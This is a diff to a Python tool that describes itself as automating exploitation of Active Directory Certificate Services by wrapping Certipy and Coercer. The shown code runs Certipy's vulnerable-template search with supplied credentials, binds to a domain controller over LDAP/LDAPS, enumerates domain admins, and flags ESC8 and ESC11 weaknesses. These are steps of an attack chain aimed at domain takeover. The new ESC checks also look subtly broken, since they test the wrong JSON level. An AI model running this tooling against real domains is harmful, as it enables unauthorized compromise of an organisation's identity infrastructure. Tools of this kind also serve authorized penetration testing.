@@ -6,6 +6,7 @@ This tool tries to automate the process of exploiting ADCS by weaponizing certip
 
 References:
 https://github.com/ly4k/Certipy
+https://github.com/p0dalirius/Coercer
 
 MIT License
 
@@ -101,6 +102,10 @@ class Exploit:
         print("[*] Trying to find vulnerable certificate templates")
         certipy_results = subprocess.run(["certipy", "find", "-u", f"{self.__username}@{self.__domain}", "-p", self.__password, "-dc-ip", self.__target, "-vulnerable", "-json", "-output", f"{self.__certipy_output_prefix}"], capture_output=True, text=True).stdout
 
+        if "Got error: socket connection error while opening: timed out" in certipy_results: 
+            print(f'[-] Connection to the domain controller timed out')
+            return False
+
         # If authentication against LDAP did not work, try to use every single domain part
         if re.search(rf'Invalid credentials', certipy_results):
             if int(self.__level) == 3:
@@ -123,7 +128,7 @@ class Exploit:
         try:
             self.__ldap_bind = ldap3.Connection(l_server, user=f'{self.__domain_parts[0]}\\{self.__username}', password=f'{self.__password}', auto_bind=True)
             print(f"[+] Bind to ldap://{self.__target}:389 successful")
-        except ldap3.cacsore.exceptions.LDAPSocketOpenError:
+        except ldap3.core.exceptions.LDAPSocketOpenError:
             print(f"[-] Binding to ldap://{self.__target}:389 failed")
             print(f"[*] Trying to bind to ldaps://{self.__target}:636")
             l_server = ldap3.Server(f'ldaps://{self.__target}:636', get_info=ldap3.ALL)
@@ -139,6 +144,10 @@ class Exploit:
         except ldap3.core.exceptions.LDAPBindError:
             print(f"[-] Binding to ldap://{self.__target}:389 failed, invalid credentials\n")
             return False
+        except ldap3.core.exceptions.LDAPSocketOpenError:
+            print(f"[-] Binding to ldap://{self.__target}:389 failed, connection timed out\n")
+            return False
+
     
     def get_domain_admins(self) -> list:
         print(f"[*] Getting Domain SID")
@@ -189,11 +198,13 @@ class Exploit:
         self.__ca_dns = certipy_json["Certificate Authorities"]['0']['DNS Name']
 
         # Get Vulnerabilities 
-        if certipy_json["Certificate Authorities"]['0']['[!] Vulnerabilities']['ESC8']:
-            self.__vulns.append('ESC8')
-            
-        if certipy_json["Certificate Authorities"]['0']['[!] Vulnerabilities']['ESC11']:
-            self.__vulns.append('ESC11')
+        if 'ESC8' in certipy_json:
+            if certipy_json["Certificate Authorities"]['0']['[!] Vulnerabilities']['ESC8']:
+                self.__vulns.append('ESC8')
+
+        if 'ESC11' in certipy_json:  
+            if certipy_json["Certificate Authorities"]['0']['[!] Vulnerabilities']['ESC11']:
+                self.__vulns.append('ESC11')
             
         if self.__vulns:
             print(f'[+] Found vulnerabilities: {self.__vulns}')
